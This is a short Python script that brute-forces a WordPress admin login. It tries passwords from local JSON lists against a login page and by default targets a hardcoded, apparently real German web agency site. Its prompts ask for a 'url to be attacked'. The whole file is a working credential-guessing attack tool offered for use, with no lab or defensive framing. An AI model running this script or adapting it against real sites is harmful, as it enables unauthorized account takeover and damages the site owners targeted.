import requests
import random
import json

def printOnBoot():
    f = open("ascii.txt", "r")
    ascii = f.read()
    print(ascii)

printOnBoot()

def writeToFile(fileName, fileText, fileExtension):
    f = open(fileName + "." + fileExtension, "a")
    f.write(fileText)

def connect(url, pwd):
    data = {
        "log":"admin",
        "pwd":pwd,
        "wp-submit":"Anmelden",
        "redirect_to":"https://www.webagentur-dokoupil.de/wp-admin/",
        "testcookie":"1"
    }
    r = requests.post(url=url, data=data)
    response = r.text
    if("Passwort vergessen?" in response):
        print("wrong pwd")
    else:
        print("we are in, ladies!")
        pass

def worker(url):
    print("[USED URL]: " + url)
    pwds = json.loads(open("passwords.json").read())

    for pwd in pwds:
        print("using: " + pwd)
        connect(url, pwd)

def workerCommon(url):
    print("[USED URL]: " + url)
    pwds = json.loads(open("common.json").read())

    for pwd in pwds:
        print("using: " + pwd)
        connect(url, pwd)

def main():
    yesOrNo = input("Would you like to use a costum url? (/login)")
    if(yesOrNo == "Yes"):
        url = input("Please enter your desired url to be attacked.")
        yesOrNo = input("Would you like to try the common passwords first?")
        if(yesOrNo == "Yes"):
            workerCommon(url)
        else:
            worker(url)
    else:
        yesOrNo = input("Would you like to try the common passwords first?")
        if(yesOrNo == "Yes"):
            workerCommon("https://www.webagentur-dokoupil.de/login/")
        else:
            worker("https://www.webagentur-dokoupil.de/login/")

main()